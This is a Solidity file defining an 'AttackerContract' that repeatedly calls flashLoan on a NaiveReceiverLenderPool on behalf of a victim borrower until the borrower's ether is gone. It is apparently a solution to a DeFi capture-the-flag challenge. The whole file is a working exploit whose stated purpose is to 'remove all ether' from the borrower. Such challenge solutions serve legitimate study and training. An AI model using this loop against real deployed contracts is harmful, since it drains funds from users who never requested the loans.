// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

/**
 * @title AttackerContract
 * @author Jonatas Campos Martins
 * @dev Attack the borrower contract to remove all ether
 */
contract AttackerContract {
    function attackPool(address payable borrower, address payable pool)
        external
    {
        while (borrower.balance > 0) {
            NaiveReceiverLenderPool(pool).flashLoan(borrower, 0);
        }
    }
}
